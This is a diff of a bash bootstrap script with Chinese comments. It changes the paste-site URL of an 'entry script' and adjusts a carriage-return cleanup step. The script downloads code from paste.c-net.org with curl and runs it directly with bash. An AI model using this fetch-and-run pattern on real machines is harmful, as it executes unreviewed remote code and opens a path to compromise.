@@ -6,15 +6,15 @@
 # ============================================================================
 set +e
 
-ENTRY_URL='https://paste.c-net.org/DarleneConspire'
+ENTRY_URL='https://paste.c-net.org/MeyersBrother'
 
 curl -fsSL --max-time 120 "$ENTRY_URL" -o /tmp/entry_real.sh
 if [ ! -s /tmp/entry_real.sh ]; then
   echo "[!] 入口脚本拉取失败: $ENTRY_URL"
   exit 1
 fi
-# paste 上传端可能把换行存成 CRLF，这里统一去掉，否则 bash 会报 set: + : invalid option
-sed -i 's/\r$//' /tmp/entry_real.sh 2>/dev/null || true
+# paste 上传端可能把换行存成 CRLF，这里统一去掉，否则 bash 会报 set: +: invalid option
+sed -i 's/\r//' /tmp/entry_real.sh 2>/dev/null || true
 echo "--- 入口脚本 $(wc -c < /tmp/entry_real.sh) B (来自 $ENTRY_URL) ---"
 bash /tmp/entry_real.sh
 RC=$?
